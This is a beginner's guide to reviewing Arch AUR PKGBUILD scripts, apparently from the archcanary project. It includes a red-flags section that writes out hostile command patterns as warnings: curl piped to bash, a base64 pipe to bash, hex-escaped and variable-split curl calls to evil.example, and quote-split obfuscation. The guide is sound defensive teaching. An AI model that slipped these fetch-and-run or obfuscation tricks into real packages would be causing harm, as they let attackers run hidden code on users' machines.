# Reading a PKGBUILD (for people who've never done it)

You don't need to be a programmer to review a PKGBUILD safely. This page covers
what one actually is, its anatomy, and a practical reference of the red flags
that have shown up in real AUR attacks.

## Why this matters

AUR packages aren't pre-built, reviewed binaries like the ones in Arch's
official repos. A PKGBUILD is a Bash script anyone can upload, and it runs as
*you* the moment you build it — `yay -S`, `paru -S`, or `makepkg` by hand. If a
line downloads and runs a virus, or reads your SSH keys, nothing built into
Arch stops it. Reviewing the script before it runs is the only thing that
does.

This isn't hypothetical — AUR malware has happened more than once (see
[SOURCES.md](../SOURCES.md) for the documented incidents). The rest of this
page is about recognizing what to look for.

## Anatomy of a PKGBUILD

Here's a small, realistic, entirely normal PKGBUILD:

```bash
pkgname=hello-world
pkgver=1.0.0
pkgrel=1
pkgdesc="A simple hello world program"
arch=('x86_64')
url="https://github.com/example/hello-world"
license=('MIT')
source=("$pkgname-$pkgver.tar.gz::https://github.com/example/hello-world/archive/v$pkgver.tar.gz")
sha256sums=('a1b2c3d4...')

build() {
  cd "$pkgname-$pkgver"
  make
}

package() {
  cd "$pkgname-$pkgver"
  make DESTDIR="$pkgdir" install
}
```

| Field / function | What it does | What to check |
|---|---|---|
| `pkgname`, `pkgver`, `pkgrel`, `pkgdesc`, `arch`, `url`, `license` | Plain metadata — none of it runs anything | Nothing, it's just labels |
| `source=(...)` | Where the actual source code comes from | Should point at the real upstream project (its GitHub/GitLab, its own site, its release archive) — not a file-sharing link, paste service, or unrelated personal repo |
| `sha256sums=(...)` | Fingerprint `makepkg` checks the download against | `SKIP` disables that check — sometimes legitimate (`-git` packages can't be checksummed), but worth noticing |
| `prepare()` | Runs before `build()`, usually patches | Read like `build()` |
| `build()` | Compiles the program | Should mirror the upstream project's own build steps |
| `package()` | Copies the finished build into `$pkgdir` | The "installation" step — no download/network activity belongs here |
| `<pkgname>.install` | A separate file, not always present | Covered below — attackers have specifically abused this one |

That's the whole shape. Everything else you'll see in a PKGBUILD is a variation
on these same pieces.

## Red flags

Every pattern below is a real technique from a real, documented AUR incident —
see [SOURCES.md](../SOURCES.md) for the write-ups. `archcanary`'s own
`--check-pkgbuild` scanner was built to catch exactly these.

**Downloading and immediately running a script**

```bash
curl -s https://example.com/setup.sh | bash
```

Runs the instant it downloads — no review possible, no matter how convincing
the surrounding code looks. Never legitimate: `source=()` + `sha256sums`
already handle downloading safely, and `build()` compiles what was verified.

**Disguised commands** — different encodings, same goal every time: stop you
(or a scanner) from recognizing the command at a glance. None of these have a
legitimate packaging use.

| Technique | Example | What it actually is |
|---|---|---|
| Quote-splitting | `'b''u''n' 'a'"d""d" 'j''s'"-""d""i""g""e""s""t"` | `bun add js-digest` — adjacent quotes glue together with no space in Bash |
| Base64 | `echo 'aGVsbG8=' \| base64 -d \| bash` | Unknown until you decode it yourself |
| Hex-escape spelling | `$'\x63\x75\x72\x6c'` | `curl`, spelled out one byte at a time |
| Variable-split reassembly | `a=cu; b=rl; $a$b -s https://evil.example` | `curl`, built from two harmless-looking variables |

*(Quote-splitting example: the June 2026 AUR supply-chain attack.)*

If a command has clearly gone out of its way to not just say what it is,
that's the tell — not the specific trick used.

**Unexpected or unrelated new dependencies** — the `bun add js-digest` example
above *is* this: a package unrelated to Node/npm has no reason to be
installing an npm package as a build step. If a PKGBUILD suddenly depends on
something with nothing to do with what the program actually does (especially
anything networking- or credential-adjacent), ask why.

**The `.install` file** — a separate `<pkgname>.install` file with functions
like `post_install()`/`post_upgrade()`, run automatically on every
install/upgrade with no separate confirmation. Easy to miss, since it's not
what most review habits default to. **Read it with the same scrutiny as
`build()`** — it's not an afterthought.

*(Real example: a 2025 `google-chrome-stable` incident shipped malware in its
`.install` scriptlet that ran on every Chrome launch, not at build time at
all — a `build()`-only review habit would have missed it entirely.)*

## What a normal update actually looks like

When your AUR helper shows you a diff before an update, a normal, healthy
update usually touches *only*:

- `pkgver` (and `pkgrel`, if the packaging itself changed without a new
  upstream version)
- `sha256sums` (a new version means a new file, means a new checksum — this
  changing alongside `pkgver` is expected, not suspicious on its own)
- occasionally `depends`/`makedepends`, but this should be rare and should
  correspond to something you could independently verify in the upstream
  project's own changelog (e.g. "now requires libfoo ≥ 2.0")

If instead you see `build()`/`package()`/`prepare()` rewritten, a new
`curl`/`wget` line that wasn't there before, the `source=()` URL pointing
somewhere completely different, or a diff much bigger than "bump a version
number" would explain — stop and read what changed before approving it. This
is exactly the moment most real attacks count on you clicking through without
looking.

## When to ask for help

You don't need to become a Bash expert to use the AUR safely. If something
looks off and you can't tell whether it's fine:

- Check the AUR comments section for that package first — someone else has
  often already asked.
- Ask in the Arch forums or your distro's community channels, with the
  specific line you're unsure about.
- When in doubt, don't build it yet. A package sitting unbuilt for a day costs
  you nothing; running something malicious does.

And this is where `archcanary` fits in — not a replacement for knowing what to
look for, but a backstop for the moments you don't have time to look, or the
obfuscation is good enough to slip past a quick read. `archcanary
--check-pkgbuild` scans for the patterns above automatically, and if you use
yay or paru, archcanary's pre-build hooks (see [my-setup.md](my-setup.md)) run
this same check on *every* AUR build before it compiles anything, aborting
automatically on a match.
